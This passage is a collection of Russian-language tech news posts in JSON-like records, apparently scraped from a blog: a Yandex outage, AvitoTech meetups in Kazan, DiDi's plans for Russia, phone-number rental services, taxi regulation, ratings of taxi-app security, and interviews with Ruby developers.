и повышенные коэффициенты», — заявил представитель компании.\n\r\nНа 18:00 по московскому времени заработали сервисы «Яндекс.Почта», «Яндекс.Директ» и «Яндекс.Такси».\n\r\nНа 19:00 по московскому времени «Яндекс» полностью восстановил работу сервисов после произошедшего сбоя, об этом сообщили агентству «Интерфакс» в пресс-службе компании. В настоящее время, по заявлению представителей «Яндекса», все приложения и сервисы работают в штатном режиме.\n\r\n«Приносим извинения пользователям за временные неудобства», — сказали в пресс-службе «Яндекса».\n\r\nРанее 27 января 2019 года произошел масштабный сбой в работе почтового сервиса Mail.ru. После восстановления работоспособности сервиса почти через пять часов, почтовый сервис Mail.ru заработал в штатном режиме.\n\r\nПользователи сервисов «Яндекса» также столкнулись с проблемами в это время. Массовые жалобы начали поступать примерно в 12:00 по московскому времени 27 января 2019 года. Проблемы связаны с работой почты (64%), сайта (32%) и сервисом «Яндекс.Деньги» (3%). В «Яндексе» сообщили изданию “Коммерсантъ”, что все сервисы «работают в штатном режиме». «Сложности с доступом к почте у отдельных пользователей связаны с тем, что в приложении «Яндекс.Почта» можно добавить аккаунт не только «Яндекса», но и других почтовых сервисов, у которых сегодня наблюдаются проблемы», — рассказали тогда в пресс-службе «Яндекса».\n\r\nСамая долгая по времени и масштабная авария была у «Яндекса» в 2011 году. Сбой произошел 19 августа, длился примерно с 19:00 до 23:00 и выразился в прекращении работы всех сервисов, включая поиск. После ликвидации неполадок представитель компании рассказал, что авария произошла из-за «проблем с маршрутизацией в сети «Яндекса».", {"day": "5", "month": "февраля", "time": "17:25"}, {"rate": 19, "views": 34000}], ["Уже четыре года мы поддерживаем IT-комьюнити в России. Мы провели кучу митапов в московском офисе Авито, а потом подумали, что отсутствие офиса в городе — не повод не проводить там митап. \nМы хотим, чтобы независимые сообщества разработчиков развивались по всей стране и больше друг с другом взаимодействовали. Это может звучать напыщенно, но талантливые и интересные люди есть везде, а общий опыт и знания помогают нам развиваться и быстрее решать задачи. \nТак родилась идея провести свои региональные мероприятия, чтобы поближе со всеми познакомиться. Мы назвали её AvitoTech On Tour. \nВ феврале мы проведём два митапа в Казани: первый по Go с сообществом GolangKazan, второй по фронтенду. На них выступят классные спикеры из Санкт-Петербурга, Минска, Казани и Москвы. Казанские митапы — наша пилотная попытка провести мероприятия вместе с локальными комьюнити в регионах, так что пожелайте нам удачи и приходите поддержать. \nПод катом — даты мероприятий, имена спикеров, подробные программы и ссылки на регистрацию. \n\nA-level Go meetup\nОткрывает наш тур совместный митап с сообществом GolangKazan. Он пройдёт 8 февраля с 15:30 до 20:00. Поговорим о работе с миграцией базы данных в Go, основных принципах gopls, разборе и сравнении данных в большом XML на маленькой VDS и CI/CD для Go проектов на платформе drone.io.\nС докладами выступят эксперты компаний «Дремучий лес», Ozon.ru, Авито и Marketplace Technologies. \nДоклады\nРазбор и сравнение данных в большом XML на маленькой VDS — Филипп Кулин, Дремучий Лес\n \nПосмотрим, как оптимизировать скорость и загрузку памяти при разборе и хранении большого XML-файла. Научимся искать отличающиеся данные между двумя большими XML-файлами. Сравним техники и рассмотрим грабли, на которые Филипп сам наступил. А ещё поговорим о фреймворке gRPC. \n\r\nФилипп занимается хостингом уже 18 лет. Более 7 лет активно интересуется вопросами блокировок в России, и с весны 2018 года ведёт мониторинг за блокировками Роскомнадзора. \n\nРабота с миграциями базы данных в Go — Тамара Веденина, Ozon.ru\n \nДля работы с миграциями базы данных есть много инструментов, написанных на разных языках. В Go такие инструменты тоже есть, хотя они и очень простые. Тамара расскажет про самые популярные из них. В докладе будут примеры кода, сравнения реализаций и подводные камни.\n\r\nТамара разрабатывает информационные системы в Ozon. Пишет на Go разные сервисы торговой площадки.\n\n“Go, please”: language server под микроскопом — Илья Данилкин, Авито\n \nИлья расскажет об основных принципах работы gopls и LSP-протокола в целом, а также о плюсах и минусах их использования. Все вместе сравним возможности language server’а и IDE Goland, рассмотрим реализацию одной из команд протокола на конкретном примере.\n\r\nИлья — backend-разработчик в Авито, занимается продуктовой разработкой в команде Auto B2B. Раньше работал в Gett и Ozon.\n\nCI/CD для Go проектов на drone.io — Алик Хилажев, Marketplace Technologies\n \nПоговорим об установке и конфигурации drone.io, о создании пайплайна для Go проекта, и посмотрим на пример реализации своего плагина для этой платформы.\n\r\nАлик работает в Marketplace Technolgies, занимается разработкой сервисов на GoLang и поддержкой инфраструктуры.\n\nМодератором митапа будет Александр Кирюхин из сообщества GolangKazan. Чтобы не устать от обилия информации, в 17:35 прервёмся на кофе-брейк. А ещё мы захватим в тур фирменные игры, чтобы вместе повеселиться и познакомиться в процессе. \nПароли и явки\nМитап начнётся 8 февраля в 15:30 и закончится в 20:00. Участие бесплатное, но нужно зарегистрироваться на сайте meetup.com. После докладов будет afterparty в баре, так что не торопитесь уходить!\nАдрес: Казань, ул. Татарстан, д. 20А, 2 этаж, пространство креативных индустрий «Штаб».\nЕсли не сможете прийти на встречу, то смотрите прямую трансляцию на ютуб-канале AvitoTech. В прямом эфире можно будет задать вопросы, которые мы озвучим спикерам.\n\n\nAvito Frontend meetup\nНаш первый фронтенд-митап в Казани пройдёт 15 февраля в 15:30. С докладами выступят разработчики из Минска, Казани и Москвы — представители компаний Spiral Scout, Neuron.Digital, Provectus и Авито.\nОбсудим протокол http/3, спецификацию JSON API и вопрос о том, кто поможет современному фронтендеру не сойти с ума от обилия новых технологий. \nДоклады\nФронтопс? Серьёзно? — Анна Селезнёва, Spiral Scout\n \nФронтенд стремительно развивается, и рядовому фронтендеру нужно осваивать всё больше новых технологий, не связанных с разработкой напрямую. К сожалению, не всегда можно найти на это время, что сказывается на качестве продукта не самым лучшим образом. О чём можно забыть, разрабатывая проект с нуля и поддерживая его во время активного использования? Кто тот супергерой, который поможет облегчить его разработку, обеспечить успешный запуск и гарантировать длительное существование?\n\r\nАнна — ведущий фронтенд-разработчик в Spiral Scout, соорганизатор сообществ MinskCSS и MinskJS. Любит вдохновлять и мотивировать людей. \n\nJSON API: работаем по спецификации — Алексей Авдеев, Neuron.Digital\n \nАлексей расскажет, в чём суть спецификации JSON API, чем она дополняет RESTful и чем отличается от GraphQL. Обсудим плюсы, минусы, подводные камни и, конечно же, опыт использования.\n\r\nАлексей — ведущий разработчик в команде Neuron.Digital, руководитель отдела фронтенд-разработки, организатор JS NN #3 и DevOps NN #1. Увлекается туризмом, code-review и рефакторингом.\n\nHTTP/3… а уже можно? — Александр Зубов, Авито\n \nСкоро 30 лет с даты создания первого черновика протокола http. Что изменилось с тех пор, а что не изменилось? Поговорим о перспективах нового протокола http/3, сроках, когда можно будет использовать его на бою, и как помочь приблизить этот момент.\n\r\nПоследние 6 лет Александр работает в Авито, до этого трудился в разных отраслях от eCommerce до fintech. В Авито он руководит небольшой командой и отвечает за архитектуру фронтенда мобильной и десктопной версий сайтов.\n\nПишем фронтенд без использования JavaScript. Опять — Садретдинов Руслан, Provectus\n \nВсё новое — хорошо забытое старое? В конце 2018 была анонсирована библиотека Phoenix LiveView для фреймворка Phoenix на некогда хайповом языке Elixir. Что будет, если ради эксперимента взять и переписать весь фронтенд мини-приложения на нём?\n\r\nРуслан — ведущий фронтенд-разработчик в Provectus, работал как в командах по 20 человек, так и в полном одиночестве. Увлекается сноубордом и топит за Typescript.\r\nПосле второго выступления отвлечёмся на кофе-брейк, где можно будет поесть и поближе познакомиться с другими участниками. \nПароли и явки\nНачнём 15 февраля в 15:30 и закончим в 20:00. Участие бесплатное, но нужно зарегистрироваться на Timepad. После митапа приглашаем всех на afterparty в бар, чтобы достойно завершить субботу.\nАдрес: Казань, ул. Татарстан, д. 20А, 2 этаж, пространство креативных индустрий «Штаб».\nПо традиции для тех, кто не сможет прийти на встречу, будет прямая трансляция на ютуб-канале AvitoTech. В прямом эфире можно задавать вопросы, которые мы озвучим экспертам на митапе.\n\n\nПланы на будущее\n29 февраля AvitoTech On Tour отправится в Нижний Новгород с митапом по Mobile. Сейчас мы формируем программу и утверждаем со спикерами темы выступлений. Опубликуем анонс в блоге, как только закончим со всей подготовкой. \nДо встречи!", {"day": "24", "month": "января", "time": "11:07"}, {"rate": 14, "views": 2300}], ["Китайская компания Didi Chuxing, которая владеет такси-агрегатором DiDi, собирается открыть офис в России. Её представители начали поиск главы местного подразделения и открыли вакансию PR-менеджера на сервисе LinkedIn. Офис компании будет располагаться в Санкт-Петербурге. \n\r\nКак пишет издание РБК со ссылкой на собственные источники, знакомые с ситуацией, Didi Chuxing уже организовала несколько собеседований с кандидатами на место руководителя российского подразделения. Тем не менее, как утверждает собеседник издания, деталей работы компания соискателям пока не сообщила.\n\r\n«Они действительно хотят открыть офис, но, чем он будет заниматься, неизвестно. Может быть, пока речь идет исключительно об аналитической службе, которая изучит ситуацию на транспортном рынке в России. На основании анализа они смогут решить, стоит заходить на этот рынок или нет», — заявил собеседник РБК.\n\r\nНа сегодня Didi Chuxing является крупнейшим в Китае сервисом по заказу такси и оказанию услуг каршеринга. Сервис запустила в 2012 году корпорация Alibaba Group, а уже в 2016 году Didi Chuxing вытеснила с отечественного рынка американскую компанию Uber, выкупив её региональное подразделение. Кроме того, компания выкупает доли в подобных предприятиях в странах Азии, Восточной Европы и Латинской Америки. \n\r\nСлухи о том, что подразделение такси-агрегатора DiDi откроется в России, появились ещё в 2017 году. Тогда об этом заявлял Кирилл Дмитриев, глава Российского фонда прямых инвестиций (РФПИ), вложившего в 2016 году деньги в Didi Chuxing через Российско-китайский инвестиционный фонд. Объёмы инвестированных средств неизвестны. \n\r\nВ июле прошлого года Didi Chuxing привлекла $600 млн от компании Toyota Motor. Китайское предприятие планировало создать совместную с Toyota Motor компанию, которая будет заниматься внедрением искусственного интеллекта и разработок Toyota в Didi. По информации The Wall Street Journal, оценка компании в ходе раунда составила около $62 млрд.\n\r\nТакже Didi Chuxing занимается разработками в сфере беспилотных автомобилей. В 2020 году предприятие запустило экспериментальный проект по распознаванию лиц в автомобилях и обнаружению признаков сонливости у водителей в нескольких городах Китая. Чтобы защитить данные пользователей, собранная информация будет зашифрована и доступна только командам по обеспечению безопасности в случае аварий. Технология распознавания лиц будет работать через приложение на смартфоне водителя. \n\r\nПомимо этого, компания будет использовать GPS и данные акселерометра, чтобы выявлять опасный стиль вождения, сообщает издание South China Morning Post. Новую технологию DiDi анонсировала в рамках подготовки к китайскому Новому году, во время которого дороги в Китае загружены сильнее всего.\n\r\n«Эта инициатива напоминает меры Uber по борьбе с вождением в сонном состоянии. Но американская компания выбрала менее высокотехнологичный подход. Она автоматически блокирует приложение для водителей после 12 часов работы», — пишет SCMP.\n\r\nКак указывает исследование Аналитического центра при правительстве Российской Федерации, в 2019 году объем легального рынка такси вырос на 5,6% и достиг 709 млрд рублей. Объёмы нелегального могут составить более 100 млрд. В целом по стране, как считают в центре, около 12% поездок приходится на нелегальных перевозчиков. Доля агрегаторов составляет 53%. Из них 24% приходится на «Яндекс.Такси». За ним следуют ГК «Везет» (11%), «Максим» (8%), Gett (4%) и «Ситимобил» (1%). На остальные агрегаторы приходится 5%. Оставшиеся 35% рынка такси занимают самозанятые и ИП.", {"day": "17", "month": "января", "time": "12:49"}, {"rate": 6, "views": 18000}], ["Требование обязательной идентификации пользователей мессенджеров по номеру телефона спровоцировало рост сервисов анонимной верификации. Онлайн-ресурсы блокируют пользователей, которые верифицируются с помощью арендованных номеров, но их пул быстро обновляется, пишет «Коммерсантъ». \n\r\nВ интернете появляется всё больше российских сервисов, которые предоставляют такую услугу. Это не только мошенники, но и просто осторожные граждане, которые не хотят разглашать личный номер при регистрации в каждом мусорном сервисе или на сайте знакомств. Вполне естественное желание, потому что после разглашения номера на него поступают нежелательные звонки из колл-центров, начинает приходить реклама, а сам номер привязывается к аккаунту пользователя. \n\r\nСпециалисты по информационной безопасности перечисляют ряд сайтов, которые предоставляют услуги анонимной верификации, например, sms-reg.com, getsms.online, smska.net, simsms.org и другие. \n\r\nФактически подобные сервисы предоставляют мобильный номер в аренду на срок от 20 минут до нескольких часов, это стоит от 3 до 300 руб., пояснил технический директор Qrator Labs Артём Гавриченков. \n\r\nПри этом используются мобильные ёмкости мобильных операторов нескольких стран. Эксперт отмечает, что судя по ошибкам в англоязычных версиях сайтов, сервисы направлены на русскоязычную аудиторию. \n\r\nВ числе сервисов, на которых можно верифицироваться анонимно: \n\n\nMail.ru; \n\n«ВКонтакте»; \n\n«Одноклассники»; \n\nAvito; \n\n«Юла»; \n\nWhatsApp; \n\nViber; \n\nTelegram; \n\nFacebook; \n\nTwitter; \n\n«Яндекс»; \n\nGett; \n\n«Ситимобил»; \n\nBadoo; \n\nMamba; \n\nи другие.\n \r\nАртём Гавриченков объясняет, что cервисы используют пробелы в утверждённых правительством правилах идентификации пользователей мессенджеров и социальных сетей по номеру телефона. \n\r\nПравила вступили в силу 5 мая 2019 года. Согласно регламенту, мессенджер должен направить уведомление о регистрации нового пользователя сотовому оператору, а тот в течение 20 минут дать ответ, есть ли номер этого пользователя в его базе. Если номера в базе нет или ответ от оператора не приходит, мессенджер обязан отказать в приёме и передаче сообщений. \n\r\nСобеседники в нескольких крупных операторах связи пояснили, что такие сервисы обычно используют сим-карты, массово закупленные на физических или юридических лиц. Всё абсолютно законно. Формально человек, зарегистрировавший сим-карту на своё имя и передавший её другому лицу, не нарушает закон. То есть формально закон не запрещает отдавать свою сим-карту в пользование другому человеку, хотя это и нарушает дух закона и его смысл. Но пока что пробел де-факто не устранён. \n\r\nСервисы анонимной верификации — огромная проблема всех онлайн-ресурсов, где регистрация осуществляется по мобильному телефону, подтвердили представители Avito. Исполнительный директор сервиса знакомств Mamba Ярослав Сергеев говорит, что проблема существует уже несколько лет, а решить её можно только по линии правоохранительных органов и регуляторов: «У нас есть чёрный список, который собирается из номеров заблокированных анкет. Повторная верификация номером из чёрного списка невозможна». \n\r\nДругие сервисы ведут аналогичные базы. \n\r\n«В текущих реалиях, увы, полностью решить проблему анонимной верификации нельзя», — прокомментировал представитель «Ситимобил». При вбросе очередного пула таких номеров команда сервиса определяет их по косвенным признакам и блокирует, сказал представитель компании. \n\r\nИспользуя сервисы для анонимной регистрации, нужно помнить, что номер контролируется посторонним лицом, который всегда может получить доступ к вашему аккаунту. \n\r\nИнтересно, что действующее законодательство не регулирует деятельность таких ресурсов: «В силу того, что никто из клиентов не становится владельцем номера, такие сервисы не являются операторами связи или лицами, действующими от их имени, не обязаны обеспечивать идентификацию пользователей и не могут быть привлечены к административной ответственности», — объяснил эксперт. На них не распространяются правила по обязательному хранению и передаче информации и так далее.", {"day": "20", "month": "декабря", "time": "10:26"}, {"rate": 12, "views": 11000}], ["Компании «Везет», Gett, «Ситимобил» и «Яндекс.Такси» разместили совместное заявление, в котором они в целом поддержали законопроект о регулировании такси, но попросили отменить положение об ограничении количества разрешений на работу для водителей.\n\r\n«Такие изменения, как, например, неоправданное ограничение числа разрешений такси или завышенные требования для водителей, которые хотят работать в такси. Все это может спровоцировать уход в серую зону, где нет ни контроля качества, ни страхования, ни адекватных мер безопасности», — заявили авторы обращения. \n\r\nПо мнению агрегаторов, законопроект учитывает особенности российского рынка такси, а также принимает во внимание предложения IT-компаний и является «ответом на вызовы, с которыми сталкивается отрасль». Они указали, что в документе поднимаются важные вопросы, такие как электронные реестры и путевые листы, дистанционные технические и медицинские осмотры, а также возможность для самозанятых водителей получать разрешения на перевозки и солидарная ответственность в случае ДТП.\n\r\n«Однако информационные онлайн-сервисы не являются перевозчиками. Важно отметить, что специфика нашей деятельности позволяет повысить уровень безопасности поездок наших партнеров с помощью цифровых технологий. Учитывая данный факт, мы полагаем, что зоны ответственности разных участников рынка должны быть определены максимально четко», — подчеркивают авторы обращения.\n\r\nВице-спикер Совета Федерации и секретарь генсовета «Единой России» Андрей Турчак совместно с другими сенаторами и депутатами 18 декабря внесли данный законопроект. Он предполагает, что в каждом регионе власти могут устанавливать максимальное количество легковых такси, но не меньше 30 автомобилей на 1 тысячу жителей. По мнению соавтора документа Людмилы Боковой, сейчас в крупных городах мира с максимальной плотностью населения предлагается от 12 до 15 машин на тысячу жителей, а в некоторых российских регионах число выданных разрешений приближается к десяти на тысячу жителей. \n\r\nКроме того, авторы законопроекта предложили получать разрешение на перевозки не только юрлицам и индивидуальным предпринимателям, но и самозанятым; запретить управлять легковым такси на основании иностранных или международных водительских удостоверений; проходить предрейсовый и послерейсовый медицинский осмотр дистанционно с помощью телемедицины; ввести «шашечки» на боковых поверхностях кузова и оранжевый фонарь на крыше такси; солидарную ответственность для служб заказа такси за действия ИП и самозанятых, оказывающих услуги.\n\r\nВ начале декабря Роскачество опубликовало результаты исследования 40 наиболее популярных мобильных приложений для заказа такси, которые доступны для скачивания в App Store и Google Play. Эксперты оценивали приложения по таким параметрам, как функциональность, удобство и безопасность.\n\r\nПо итогам исследования работа всех приложений была признана как минимум удовлетворительной. Лучшие оценки получили приложения «Яндекс.Такси» и UBER Russia (для iOS и Android), а также «Ситимобил» (для Android) и Gett (для iOS). См. также: «Как я нашел способ отследить всех водителей «Ситимобил»»", {"day": "19", "month": "декабря", "time": "11:55"}, {"rate": 7, "views": 3600}], ["Роскачество опубликовало результаты исследования мобильных приложений для заказа такси. Эксперты проверили 40 наиболее популярных мобильных приложений, которые доступны для скачивания в App Store и Google Play в России. Роскачество оценивало приложения по таким параметрам, как функциональность, удобство и безопасность.\n\r\nВ исследование вошли приложения сервисов, предоставляющие услуги по заказу такси экономического или комфорт-класса (а также их аналогов) как минимум в Москве или Санкт-Петербурге и имеющие на момент тестирования количество оценок в Google Play не менее 300, а в App Store — не менее 50. В исследование не вошли мобильные приложения, которые не позволяют заказать такси онлайн и оплатить поездку банковской картой.\n\r\nПо итогам исследования работа всех приложений была признана как минимум удовлетворительной. Более половины из них — 22 — заслужили оценку выше четырех баллов.\n\r\nКак следует из отчёта Роскачества, характеристика функциональности включает в себя такие показатели, как полнота информации о водителях, возможность оставить комментарий для водителя и связаться с ним, а также наличие сервиса отслеживания поездки по карте; удобство использования — простоту и качество навигации, адаптацию сервиса для людей с ограниченными возможностями; безопасность — надежность передачи данных пользователей, наличие шифрования и уязвимостей, запрос разрешений и согласия на обработку данных, а также возможность удалить аккаунт пользователя.\n\r\nЛучшие оценки по сумме всех показателей Роскачество поставило приложениям «Яндекс.Такси» и UBER Russia (для iOS и Android), а также «Ситимобил» (для Android) и Gett (для iOS).\n\r\nПри этом самым важным критерием для приложения эксперты Роскачества назвали его безопасность. \n\r\n«Крайне важная группа показателей, потому как данная категория мобильных приложений включает в себя сбор и хранение личных данных, а также онлайн-оплату услуги. Одним из ключевых критериев в данной группе является безопасность передачи пользовательских данных. Эксперты с помощью специализированного ПО производили захват всего трафика, который пересылает исследуемое приложение, а затем анализировали его на наличие как незашифрованного контента, так и незашифрованных пользовательских данных. Большинство приложений, а именно — 75%, получили по данному критерию самый высокий балл. Это значит, что все данные пользователя передаются с использованием алгоритмов шифрования», — говорится в отчёте.\n\r\nНаихудшую оценку (1/5) по данному критерию получило приложение «Масани» (работает и на iOS, и на Android). По сведениям Роскачества, оно передает в незашифрованном виде геоданные, номер мобильного телефона с пинкодом и комментарий к заказу. Также низкий балл по безопасности получили приложения inDriver, «Такси 777» и «Ангел» на iOS и на Android.\n\r\n«Незашифрованный контент при передаче возможно подменить исполняемым файлом, при открытии которого может быть выполнена вредоносная программа. Таким образом, что мало вероятно, но тем не менее возможно, при желании и определенных навыках злоумышленник может получить контроль над устройством. Более того, отсутствие шифрования делает устройство уязвимым для атак», — говорится в отчете.\n\r\nВ результате самыми безопасными приложениями были признаны на iOS: Uber Russia (4,8 балла из 5), «Яндекс.Такси» (4,5), Gett (4,4), «Rutaxi Онлайн» (4,4) и «Везет (Rutaxi)» (4,4); на Android: «Яндекс.Такси» (4,8), «Uber Russia» (4,43), «Рутакси» (4,4) и inDriver (4,4).", {"day": "3", "month": "декабря", "time": "17:24"}, {"rate": 4, "views": 2200}], ["До конференции RubyRussia остается совсем немного времени. У тех, кто не успел получить свой билет, еще есть шанс забрать на сайте один из последних. Никита Шильников на конференции расскажет об алгебраическиех эффектах, а пока можно почитать интервью по теме доклада.\n\n\n\nРасскажи, чем ты занимаешься и как это связано с Ruby?\n\r\nЯ работаю в двух компаниях, проекты которых написаны на Ruby. В одной мы делаем биллинг, можно сказать, что это такой полу-энтерпрайз, а в другой создаем SaaS-сервис. Так сложилось, что много занимаюсь open source. Четыре года назад я заинтересовался одним проектом, нашел недостатки функциональности в нем, решили исправить и пошло-поехало. Сейчас я core-разработчик двух организаций и комьюнити. Все можно увидеть на моем Github. Одна часть работы касается баз данных rom-rb, а другая dry-rb – это набор библиотек на разные случаи жизни.\n\nТвой доклад про алгебраические эффекты, расскажи какую пользу они дают разработчикам.\n\r\nЗдесь нужно небольшое овервью. Экосистема dry-rb вдохновлена функциональным программированием. Но при ее разработке кое-что не давало покоя. К примеру, ты разрабатываешь SaaS-сервис и есть простая задача по изоляции данных. Вроде все понятно, имеется какой-то сервис, в нем регистрируются компании, и у них должен отсутствовать доступ к данным друг друга. Решить можно разными способами. Но с чисто функциональной точки зрения я не находил ответ на то, как это сделать, кроме как явной передачи аргументов по всему коду. Придумал свое «нефункциональное» решение и с ним жил.\n\r\nВ конце 2018 года в React появились hooks. Когда в первый раз увидел их API, я подумал, что нельзя такие вещи сделать так просто. Прекрасно представляю, как работает JavaScript и решил, что здесь явно не все чисто, используются глобальные переменные или что-то еще. В моем представлении о том, как работает программа, это было либо невозможно, либо использовался какой-то грязный хак. Решил изучить вопрос. \n\r\nОказалось, что я не единственный человек, который интересовался этой темой. Нашел информацию, что существует такой способ формализации, то есть написание программ, которые, как будто используют глобальные переменные или какое-то общее состояние. При этом они останутся все еще чистыми. Проблема была актуальна и я начал копать глубже. В итоге ответом стали те самые алгебраические эффекты. Написал на Ruby небольшой прототип, и, на мое удивление, все заработало. Внедрил в продакшн, запустил и гонял несколько месяцев, потом сделал решение уже для всех.\n\nТы меня прямо заинтриговал с React hooks. Думал там что-то очень простое типа call stack, замыкания, текущий scope.\n\r\nОно на самом деле так и есть. Проблема в том, что у тебя имеется какая-то статья, которая описывает семантику и то, как с научной точки зрения это должно работать. Если следуешь спецификации, то у тебя появляется возможно сделать библиотеку. В случае React это тоже библиотека или, скажем, фреймворк, который предоставляет какой-то API. Если им пользоваться правильно, то все прекрасно работает. Но если ты пойдешь влево или вправо, то это может плохо кончиться. В React они просто запретили использовать hooks в условиях. Им пришлось так сделать. Это одно из ограничений.\n\nЭто как-то связано с математическим доказательством корректности кода?\n\r\nНе совсем. Тут не вопрос в том, что нужно что-то доказывать, вопрос больше в сторону верификации программ. То, о чем речь идет в алгебраических эффектах, это просто описание семантики. Там ничего не доказывается, а показано как оно должно работать. Если эта библиотека, реализующая алгебраические эффекты, сама в себе не содержит ошибок, то, описав семантику, ты гарантируешь, что твой код будет работать так, как задумывалось. \n\nА как ты относишься к типам и статически типизированным языкам программирования?\n\r\nОчень положительно. Например, у нас бэкэнд на Ruby, а фронтэнд на такой вещи как ReasonML. Это OCaml, но с другим синтаксисом. При прочих равных делаю выбор в сторону этой системы типов. Она довольно простая и существует целый ряд языков, в которых подобная или похожая реализация. Чем больше типов, тем лучше. Вместе с тем, я пишу бэкенд на Ruby и меня все устраивает. Я являюсь разработчиком тех инструментов, с которыми работаю и они всегда были про типы: dry-types, dry-struct, dry-schema, dry-validation, dry-monads. Они про то, чтобы описывать типы, которые приходят из базы данных, от пользователя, от внешних систем. Чтобы ты всегда знал, с чем у тебя работает код Ruby. Пускай даже он сам не типизирован, но ты точно можешь быть уверен в типе переменной, с которой ты работаешь.\n\nЕсть слухи, что в Ruby 3 будут типы. Что ты об этом скажешь?\n\r\nУ меня есть опыт работы с Python. Когда туда завезли типы, то тулинг был не очень развит и меня не впечатлило. Сейчас там ситуация лучше. Туда можно заходить и описывать все типами и применять какой-то тулинг, который будет проверять, что твоя программа корректна. Речь про какую-то замену компилятора, про то, что у нас сейчас делает sorbet. У Python это заняло несколько лет. Я всегда приветствую движение в сторону типов, но не питаю никаких иллюзий.\n\nСмотрел на новый синтаксис, который планируется реализовать с точки зрения кода Ruby?\n\r\nОсобо не игрался, зашел в чат, посмотрел. Но у меня нет никакого мнения по поводу того, как это стоит реализовывать. Синтаксис можно будет улучшить, изменения в языке и так далее. Сейчас они сделали обычный Ruby-совместимый синтаксис. Я не считаю, что синтаксис – это камень преткновения здесь, камень преткновения здесь тулинг и, как уже говорил, это очень долгая дорога.\n\nЧто тебе еще хотелось бы видеть в Ruby, как видишь его развитие?\n\r\nМне была бы интересна кооперативная многозадачность. У нас уже есть кооперативная многозадачность в виде fiber. Нам все равно не хватает возможности запускать их на нескольких тредах. Есть варианты того, как это будет сделано и до конца непонятно в каком виде. Учитывая, что у Ruby, у C реализации есть довольно солидное наследие, то Матц не хочет ломать обратную совместимость. Я склоняюсь к комбинации файберов и нескольких одновременно запущенных потоков. Может быть, что-то вроде Guild будет работать.\n\nВ этом году на конференцию приезжает Yukihiro Matsumoto, автор Ruby. Что тебе было бы интересно с ним обсудить за чашкой кофе или бокалом саке на афтепати?\n\r\nСамое лучшее, что мы можем сделать в общении с авторами языков или даже библиотек – это показать им, как мы используем этот продукт в реальной жизни. Причем даже так, как авторы не ожидали. Это даст автору возможность учесть такой опыт и применить его в дальнейшем развитии. Я хотел бы показать всю историю с алгебраическими эффектами. Сказал бы – вот, смотри, какую вещь можно делать на чудо-языке, который ты создал. И может он придумает после этого что-то еще для нас. \n\nУвидимся на RubyRussia!\n\r\nНапомним, что конференция уже в эту субботу, регистрация еще открыта.\n\r\nБудут не только доклады, но и стенды лучших компаний:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребряные партнеры — Валарм, JetBrains, Bookmate и Cashwagon\r\nБронзовый партнер — InSales", {"day": "26", "month": "сентября", "time": "16:42"}, {"rate": 7, "views": 1500}], ["Уже в эту субботу встречаемся со всеми рубистами на главной конференции, посвященной этой технологии — RubyRussia 2019. 28 сентября совсем близко, а в этом интервью вопросы для Xavier Noria подготовил разработчик компании Evrone Павел Аргентов, а помогли ему студенты и преподаватели, с которыми он работает над курсом «Языки интернет-программирования» в МГТУ.\n\n\nРаритетное фото с прошлого приезда Шавье в Россию — на RailsClub Moscow 2012\n\nЧто ты считаешь наиболее интересным и важным из того, что недавно произошло в мире RoR?\n\r\nЯ считаю, что Rails 6 был впечатляющим релизом. Новые основные компоненты, поддержка нескольких баз данных, распараллеленное тестирование; новый загрузчик, который «отправляет в историю» известные грабли с автозагрузкой.\n\nТы зарабатываешь на жизнь Rails консалтингом. Что это дало тебе, как программисту?\n\r\nГлавным образом, это дало мне опыт и осведомлённость, которые обычная работа не может обеспечить. Консалтинг обогащает. Каждая компания и каждая команда, они разные. Сталкиваешься с различными областями бизнеса, культурами, рабочими процессами, архитектурой, особенностями и предпочтениями. Адаптация к подвижным средам, задачи, с которыми приходится бороться, сохраняют навыки решения проблем остро отточенными.\n\nПродолжая предыдущий вопрос, исходя из твоего опыта, о чем должны помнить разработчики Rails?\n\r\nРазработчики в первую очередь должны знать Ruby и Rails как можно глубже. Это означает чтение книг и документации, а не разрозненных постов в блогах. Мастер должен владеть своим инструментом. Нужно, например, хорошо понимать SQL, чтобы Active Record был катализатором процесса, а не черным ящиком. Использовать Active Record — чтобы легко и безопасно генерировать SQL, который иначе писался бы от руки — и легко обрабатывать полученные наборы данных. Важно приличное понимание HTTP, потому что это язык, на котором приложение говорит с внешним миром (в том числе, не забывать WebSockets). Есть много других вещей, о которых следует помнить, но я бы особо отметил производительность. Нужно знать, как гонять бенчмарки, нужно знать о GVL в MRI и всякое такое. Ищите ресурсы по этой теме, изучайте их, вырабатывайте информированную интуицию.\n\nДействительно ли Ruby – это тот язык, который делает ум программиста лучше? Как извлечь из этого максимум удовольствия?\n\r\nЯ лично скептически отношусь к подобным обобщениям. Ruby волнует меня, а Scala — программистов Scala. Я занимался Perl-ом сколько-то лет и очень его люблю, но многим он не нравится. Разные мозги находят удовольствие в разных формализмах, даже ваши собственные предпочтения могут меняться со временем. Как программисту, вам лучше использовать как можно больше языков и как можно больше парадигм. Язык, который сломал мой разум – это был Prolog. Парадигма, которая больше всего на меня повлияла, состояла в «литературном программировании» в Knuth-стиле. Проходя через эти совершенно разные способы программирования, становишься лучше. Ruby я считаю особенно гибким и высокоуровневым.\r\nВысокоуровневость помогает рассуждать «ближе к задаче». Это привлекает меня в сверхвысокоуровневых языках (VHLL). По образованию я математик, и могу работать с любым формализмом, который мне подбросят; языки программирования тут – это детские игрушки. Полнота по Тьюрингу, например, не совпадает с практической эквивалентностью. Для решения реальных проблем сложно придумать что-то лучше, чем VHLL. Чувствуешь себя действительно мощным и продуктивным, потому что меньше искусственной сложности, и можно лучше сконцентрироваться на настоящем решении задачи. Решение реальных задач — вот что заставило меня заняться карьерой в программировании. Говоря в общем, «где нужен С — бери С».\n\nМы делаем конференцию более «Ruby» чем «on Rails». Какие применения Ruby существуют кроме Rails, или даже помимо webdev?\n\r\nЕсли мне не изменяет память, первой программой на Ruby, которую я использовал, был менеджер портов/пакетов на FreeBSD. Это было в начале двухтысячных еще до Rails. Популярное ПО на Ruby, не имеющее прямого отношения к веб-разработке — это Vagrant, Metasploit, Jekyll, Chef, Puppet или Homebrew. Кроме того, системы в Rails-компаниях редко состоят только из веб-интерфейса. Как правило, существует целая экосистема программного обеспечения. Компания, основным языком которой является Ruby, обычно имеет также чистое бэкэнд-ПО на Ruby (возможно, совместно с другими технологиями).\n\r\nНапример, в компании, которую я сейчас консультирую, «Stuart Delivery», я только что внедрил сервис, который принимает сообщения, приходящие из Kafka в Redis, для их обработки воркерами Sidekiq. Также поработали над нетривиальным проектом миграции данных и над суперинтересным бизнес-эмулятором. Всё написано на чистом Ruby. Фронтенд 